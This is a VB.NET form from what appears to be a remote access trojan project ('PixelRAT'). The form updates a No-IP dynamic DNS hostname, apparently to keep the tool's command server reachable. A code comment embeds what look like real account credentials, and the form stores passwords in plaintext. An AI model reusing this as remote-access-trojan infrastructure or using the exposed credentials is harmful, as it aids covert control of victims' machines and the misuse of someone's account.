Imports System.Text
Imports System.Xml

Imports System.Configuration
Imports System.Reflection

Public Class Form2
    Private Shared Function loadConfigDocument() As XmlDocument
        Dim doc As XmlDocument = Nothing
        Try
            doc = New XmlDocument()
            doc.Load(getConfigFilePath())
            Return doc
        Catch e As System.IO.FileNotFoundException
            Throw New Exception("No configuration file found.", e)
        End Try
    End Function

    Private Shared Function getConfigFilePath() As String
        Return Application.StartupPath & "\PixelRAT.config"
    End Function
    Public Shared Sub WriteSetting(ByVal key As String, ByVal value As String)
        ' load config document for current assembly
        Dim doc As XmlDocument = loadConfigDocument()

        ' retrieve appSettings node
        Dim node As XmlNode = doc.SelectSingleNode("//appSettings")

        If node Is Nothing Then
            Throw New InvalidOperationException("appSettings section not found in config file.")
        End If

        Try
            ' select the 'add' element that contains the key
            Dim elem As XmlElement = DirectCast(node.SelectSingleNode(String.Format("//add[@key='{0}']", key)), XmlElement)

            If elem IsNot Nothing Then
                ' add value for key
                elem.SetAttribute("value", value)
            Else
                ' key was not found so create the 'add' element 
                ' and set it's key/value attributes 
                elem = doc.CreateElement("add")
                elem.SetAttribute("key", key)
                elem.SetAttribute("value", value)
                node.AppendChild(elem)
            End If
            doc.Save(getConfigFilePath())
        Catch
            Throw
        End Try
    End Sub
    Private Sub MButtonnone1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButtonnone2.Click

        If CheckBox1.Checked = True Then
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\DNS.ini", "", False)
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\DNS.ini", TextBox1.Text & "|", True)
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\DNS.ini", TextBox2.Text & "|", True)
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\DNS.ini", TextBox3.Text & "|", True)
            My.Computer.FileSystem.WriteAllText(Application.StartupPath & "\DNS.ini", CheckBox1.Checked, True)
        End If


        Dim wc = New Net.WebClient()
        Dim utf8 = New UTF8Encoding
        'http://dynupdate.no-ip.com/dns?username=%22d7m@hotmail.co.uk%22&password=%22cerberus%22&hostname=%22pixelfrag.zapto.org%20%22

        MProgress1.Current = 100



        Dim page As String = utf8.GetString(wc.DownloadData("http://dynupdate.no-ip.com/dns?username=" & TextBox1.Text & "&password=" & TextBox2.Text & "&hostname=" & TextBox3.Text))
        '   MsgBox(status(1))
        Dim texter() As String = page.Split(":")
        RichTextBox1.Text = texter(1)
        If texter(1).Contains("0") Then
            MsgBox("Success - IP address is current, no update performed", MsgBoxStyle.Information)
        End If
        If texter(1).Contains("1") Then
            MsgBox("Success - DNS hostname update successful", MsgBoxStyle.Information)

        End If
        If texter(1).Contains("2") Then

            MsgBox("Error - Hostname supplied does not exist", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("3") Then
            MsgBox("Error - Invalid username", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("4") Then
            MsgBox("Error - Invalid password", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("5") Then
            MsgBox("Error - Too many updates sent. Updates are blocked until 1 hour passes since last status of 5 returned.", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("6") Then
            MsgBox("Error - Account disabled due to violation of No-IP terms of service. Our terms of service can be viewed at http://www.no-ip.com/legal/tos", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("7") Then
            MsgBox("Error - Invalid IP. Invalid IP submitted is improperly formated, is a private LAN RFC 1918 address, or an abuse blacklisted address.", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("8") Then
            MsgBox("Error - Disabled / Locked hostname", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("9") Then
            MsgBox("Host updated is configured as a web redirect and no update was performed.", MsgBoxStyle.Information)
        End If
        If texter(1).Contains("10") Then
            MsgBox("Error - Group supplied does not exist", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("11") Then
            MsgBox("Success - DNS group update is successful", MsgBoxStyle.Information)
        End If
        If texter(1).Contains("12") Then
            MsgBox("Success - DNS group is current, no update performed.", MsgBoxStyle.Information)
        End If
        If texter(1).Contains("13") Then
            MsgBox("Error - Update client support not available for supplied hostname or group", MsgBoxStyle.Critical)

        End If
        If texter(1).Contains("14") Then
            MsgBox("Error - Hostname supplied does not have offline settings configured. Returned if sending offline=YES on a host that does not have any offline actions configured.", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("99") Then
            MsgBox("Error - Client disabled. Client should exit and not perform any more updates without user intervention.", MsgBoxStyle.Critical)
        End If
        If texter(1).Contains("100") Then
            MsgBox("Error - User input error usually returned if missing required request parameters", MsgBoxStyle.Critical)
        End If



    End Sub

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim Settings(), SettingFile As String
        SettingFile = My.Computer.FileSystem.ReadAllText(Application.StartupPath & "\DNS.ini")
        Settings = Split(SettingFile, "|")

        TextBox1.Text = Settings(0)
        TextBox2.Text = Settings(1)
        TextBox3.Text = Settings(2)
        CheckBox1.Checked = Settings(3)

    End Sub

    Private Sub MTheme1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub MButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton4.Click
        Me.Hide()
    End Sub


    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged

    End Sub
End Class